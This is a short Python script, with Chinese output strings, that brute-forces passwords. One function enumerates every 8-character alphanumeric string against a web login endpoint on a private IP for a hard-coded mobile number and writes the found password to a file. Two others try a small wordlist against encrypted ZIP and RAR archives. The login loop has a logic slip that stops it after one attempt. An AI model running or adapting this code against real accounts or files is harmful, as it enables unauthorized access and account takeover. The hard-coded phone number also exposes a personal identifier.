import requests
import itertools
import json
import datetime
import zipfile
from unrar import rarfile


def burp_login():
    mylist = ("".join(x) for x in itertools.product(
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        repeat=8))
    for pwd in mylist:
        data = {'mobile': '18802094078', 'password': pwd, 'areaCode': 86}
        login_url = "http://192.168.3.19:8090/Home/Public/login"
        session = requests.Session()
        resp = session.post(login_url, data)
        res = resp.content.decode('utf-8')
        j = json.loads(res)
        code = (j["status"])
        print(pwd, code)
        if code == 200:
            print(code)
            print(pwd)
            file = open('C:/burp.txt', 'w')
            file.write("正确密码是：" + pwd)
            break
        else:
            print(pwd + ":" + code)
            print(datetime.datetime.now())
            break


def burp_zip():
    pwd = ['qq111111', '111111b', '111111', 'a111111']
    for p in pwd:
        try:
            zipFile = zipfile.ZipFile("C:/hello.zip", "r")
            zipFile.extractall(pwd=p.encode("ascii"))
            print('正确密码是：' + p)
            break
        except Exception as e:
            print('错误密码是：' + p)
            pass


def burp_rar():
    pwd = ['qq111111', '111111b', '111111', 'a111111']
    for p in pwd:
        try:
            file = rarfile.RarFile("C:/demo.rar", "r")
            file.extractall(pwd=p.encode("ascii"))
            print('正确密码是：' + p)
            break
        except Exception as e:
            print('错误密码是：' + p)
            pass


if __name__ == '__main__':
    burp_rar()
